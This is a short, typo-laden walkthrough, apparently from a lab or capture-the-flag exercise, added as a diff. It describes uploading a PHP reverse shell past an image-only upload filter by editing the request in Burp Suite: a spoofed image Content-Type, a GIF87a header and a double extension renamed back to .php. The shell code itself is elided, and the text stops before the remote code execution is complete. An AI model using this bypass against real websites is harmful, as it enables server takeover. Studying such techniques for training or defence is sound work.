@@ -1,0 +1,24 @@
+1- Enter to the website and try to upload any thing 
+2- Discover that the upload filed can only eccept imaages
+3- We can run burp suite and get the request that we apload any image (it will give my and "ok" in the web page) and send it to repeater
+4- Now we can upload the reverse shell(reverseshell.php) file on the website but we want to change some things
+	
+	Content-Disposition: form-data; name="file"; filename="reverseshell.php"
+	Content-Type: any thing
+	<?php
+	// php-reverse-shell - A Reverse Shell implementation in PHP
+	.
+	.
+	.
+To:
+
+	Content-Disposition: form-data; name="file"; filename="reverseshell.php.jpg"
+	Content-Type: image/jpeg
+
+	GIF87a <?php
+	// php-reverse-shell - A Reverse Shell implementation in PHP
+	.
+	.
+	.
+5- We change the extention of the reverseshell.php.jpg to reverseshell.php in the same request that was accepted
+6- Now we can make a remote comde excution (RCE) on the target machine but there is nother things we must do it to run the RCE
